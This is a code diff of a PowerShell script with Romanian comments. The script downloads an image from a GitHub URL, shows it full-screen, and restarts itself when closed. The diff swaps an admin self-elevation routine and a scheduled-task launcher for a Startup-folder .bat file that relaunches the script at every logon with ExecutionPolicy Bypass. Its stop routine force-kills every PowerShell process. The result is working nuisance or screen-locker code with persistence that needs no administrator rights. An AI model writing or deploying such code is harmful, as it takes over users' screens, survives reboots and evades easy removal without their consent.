@@ -2,14 +2,6 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\cdr.png"
 
-# Verifică dacă scriptul rulează cu privilegii administrative
-function Check-Admin {
-    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Start-Process powershell "-ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
-        exit
-    }
-}
-
 # Descărcare imagine
 function Download-Image {
     try {
@@ -57,18 +49,19 @@ function Show-FullScreenImage {
     $form.ShowDialog()
 }
 
-# Oprește complet scriptul și elimină sarcina din Task Scheduler
+# Oprește complet scriptul
 function Stop-All {
-    schtasks /delete /tn "PersistentImageViewer" /f | Out-Null
+    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
     Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
     exit
 }
 
-# Persistență prin Task Scheduler
+# Persistență prin folderul Startup (fără Administrator)
 function Set-Startup {
-    $taskName = "PersistentImageViewer"
     $scriptPath = $MyInvocation.MyCommand.Path
-    schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File '$scriptPath'" /sc onlogon /rl highest /f | Out-Null
+    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
+    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
+    Set-Content -Path $batFilePath -Value $batContent -Force
 }
 
 # Monitorizare proces pentru repornire automată
@@ -83,7 +76,6 @@ function Monitor-Process {
 }
 
 # Executare funcționalități
-Check-Admin
 Download-Image
 Set-Startup
 Start-Job -ScriptBlock { Monitor-Process }
